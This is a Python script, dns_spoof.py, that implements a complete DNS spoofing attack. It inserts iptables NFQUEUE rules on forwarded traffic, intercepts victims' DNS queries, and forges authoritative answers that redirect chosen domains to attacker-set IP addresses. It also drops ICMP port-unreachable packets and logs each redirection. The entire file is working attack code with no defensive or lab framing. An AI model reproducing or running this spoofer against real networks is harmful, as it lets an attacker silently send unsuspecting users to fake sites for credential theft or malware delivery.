# dns_spoof.py

import os
import logging
from netfilterqueue import NetfilterQueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, ICMP, send, conf

def init_logging(log_dir="logs", log_file="dns_spoof.log"):
    """
    Initialize file‐based logging for DNS spoof events.
    """
    if not os.path.isdir(log_dir):
        os.makedirs(log_dir)
    full_path = os.path.join(log_dir, log_file)
    logging.basicConfig(
        filename=full_path,
        level=logging.INFO,
        format="%(asctime)s %(levelname)s: %(message)s"
    )
    logging.info("=== DNS Spoofer Log Started ===")

def setup_nfqueue(queue_num=1):
    """
    Install iptables rules so DNS and ICMP port-unreachable packets hit NFQUEUE.
    """
    print("[*] Installing NFQUEUE rules (queue #{})...".format(queue_num))
    os.system("iptables -I FORWARD -p udp --dport 53   -j NFQUEUE --queue-num {}".format(queue_num))
    os.system("iptables -I FORWARD -p udp --sport 53   -j NFQUEUE --queue-num {}".format(queue_num))
    os.system("iptables -I FORWARD -p icmp --icmp-type port-unreachable -j NFQUEUE --queue-num {}".format(queue_num))

def teardown_nfqueue(queue_num=1):
    """
    Remove the NFQUEUE iptables rules.
    """
    print("[*] Removing NFQUEUE rules (queue #{})...".format(queue_num))
    os.system("iptables -D FORWARD -p udp --dport 53   -j NFQUEUE --queue-num {}".format(queue_num))
    os.system("iptables -D FORWARD -p udp --sport 53   -j NFQUEUE --queue-num {}".format(queue_num))
    os.system("iptables -D FORWARD -p icmp --icmp-type port-unreachable -j NFQUEUE --queue-num {}".format(queue_num))

def spoof_dns_packet(packet, domain_map, iface):
    """
    Craft and send a fake DNS response for the given query.
    """
    victim_ip = packet[IP].src
    domain    = packet[DNSQR].qname.decode().strip('.').lower()
    fake_ip   = domain_map[domain]

    # Reverse the original query's IP/UDP headers
    ip_layer  = IP(src=packet[IP].dst, dst=victim_ip)
    udp_layer = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)

    # Build the DNS answer section
    answer = DNSRR(
        rrname=packet[DNS].qd.qname,
        type='A', rclass='IN', ttl=300,
        rdata=fake_ip
    )
    dns_resp = DNS(
        id=packet[DNS].id,
        qr=1, aa=1,
        rd=packet[DNS].rd, ra=1,
        qd=packet[DNS].qd,
        an=answer, ancount=1
    )

    response = ip_layer / udp_layer / dns_resp
    # Force recalculation of checksums and lengths
    del response[IP].len
    del response[IP].chksum
    del response[UDP].len
    del response[UDP].chksum

    send(response, iface=iface, verbose=False)
    msg = "SPOOFED: {} requested {} → redirected to {}".format(victim_ip, domain, fake_ip)
    print("[+] {}".format(msg))
    logging.info(msg)

def start_dns_spoofer(domain_map, iface, queue_num=1):
    """
    Begin intercepting packets. Spoof matching DNS queries;
    drop ICMP port-unreachable; forward all other traffic.
    """
    conf.iface = iface
    queue = NetfilterQueue()

    print("[*] Domains to spoof: {}".format(domain_map))
    print("[*] DNS NFQUEUE running. Press Ctrl+C to stop.")
    logging.info("Started DNS spoofer on interface %s, queue %d", iface, queue_num)

    def handle_packet(nf_packet):
        raw = nf_packet.get_payload()
        pkt = IP(raw)

        # 1) Drop ICMP port-unreachable
        if pkt.haslayer(ICMP) and pkt[ICMP].type == 3 and pkt[ICMP].code == 3:
            msg = "DROPPED ICMP port-unreachable to {}".format(pkt[IP].dst)
            print("[*] {}".format(msg))
            logging.info(msg)
            nf_packet.drop()
            return

        # 2) Inspect DNS queries
        if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
            query = pkt[DNSQR].qname.decode().strip('.').lower()
            src    = pkt[IP].src
            print("[*] Intercepted DNS query '{}' from {}".format(query, src))

            if query in domain_map:
                print("    -> Spoofing {}".format(query))
                spoof_dns_packet(pkt, domain_map, iface)
                nf_packet.drop()
            else:
                print("    -> Forwarding {}".format(query))
                logging.info("IGNORED: %s requested %s", src, query)
                nf_packet.accept()
            return

        # 3) All other packets: let them pass
        nf_packet.accept()

    queue.bind(queue_num, handle_packet)
    try:
        queue.run()
    except KeyboardInterrupt:
        pass
    finally:
        queue.unbind()
        print("[*] DNS spoofer stopped, NFQUEUE unbound.")
        logging.info("Stopped DNS spoofer, NFQUEUE unbound.")
